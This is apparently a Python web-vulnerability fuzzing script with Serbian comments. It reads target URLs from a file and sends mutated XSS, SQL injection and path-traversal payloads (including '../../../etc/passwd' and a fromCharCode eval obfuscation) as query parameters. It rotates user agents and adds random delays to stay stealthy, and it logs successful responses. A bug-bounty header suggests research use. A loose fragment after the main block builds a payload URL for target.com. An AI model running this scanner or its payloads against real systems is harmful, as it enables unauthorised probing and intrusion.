# foxstrike_mutation_ai.py
import requests, random, time, os, signal, sys, base64

def sigint_handler(sig, frame):
    print("\n[!] Prekid detektovan – zatvaram lisicu.")
    sys.exit(0)
signal.signal(signal.SIGINT, sigint_handler)

# HEADERS
def prepare_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Android 11; Mobile)"
        ]),
        "Accept-Language": "en-US,en;q=0.9",
        "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ==",
        "X-Requested-With": "XMLHttpRequest"
    }

# ADAPTIVNA MUTACIJA
def adaptive_mutate(payload):
    base = [
        f"<template>{payload}</template>",
        f"<noscript>{payload}</noscript>",
        f"<form><input name='note' value='{payload}'></form>",
        f"{{\"action\": \"test\", \"data\": {{\"token\": \"{payload}\"}}}}",
        f"eval(String.fromCharCode({','.join([str(ord(c)) for c in payload])}))"
    ]
    return random.choice(base)

# PAYLOADI OSNOVA
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "' OR '1'='1",
    "../../../etc/passwd"
]

def detect_type(p):  # brza klasifikacija
    if "script" in p or "onerror" in p: return "XSS"
    elif "OR '1" in p: return "SQLi"
    elif "../" in p or "passwd" in p: return "LFI"
    return "Other"

# CSP?
def has_csp(target):
    try:
        r = requests.get(target, headers=prepare_headers(), timeout=5)
        return 'content-security-policy' in r.headers or 'Content-Security-Policy' in r.headers
    except:
        return False

def run_mutation_mode(target):
    print(f"\n[ShadowFox10.3 :: AI-MUTATOR] {target}")
    mutated_payloads = [adaptive_mutate(p) for p in base_payloads]

    for p in mutated_payloads:
        if os.path.exists("STOP_FOX"):
            print("[!] STOP_FOX signal – zaustavljam.")
            sys.exit(0)

        full_url = f"{target}?q={p}"
        try:
            r = requests.get(full_url, headers=prepare_headers(), timeout=8)
            status = r.status_code
            ptype = detect_type(p)
            print(f"[{status} :: {ptype}] {full_url}")

            if str(status).startswith("2"):
                with open("reports/stealth_hits.txt", "a") as f:
                    f.write(f"[{status} :: {ptype}] {full_url}\n")

            time.sleep(random.randint(3, 6))
        except Exception as e:
            print(f"[ERROR] {full_url} → {str(e)}")

if __name__ == "__main__":
    try:
        with open("targets.txt") as f:
            targets = [l.strip() for l in f if l.strip()]
        for t in targets:
            run_mutation_mode(t)
    except KeyboardInterrupt:
        print("\n[!] Prekid – AI agent se povlači.")
import hashlib

def hash_payload(payload):
    return hashlib.md5(payload.encode()).hexdigest()[:8]

payload = "<script>alert(1)</script>"
payload_id = hash_payload(payload)
url = f"https://target.com?q={payload}#ID-{payload_id}"
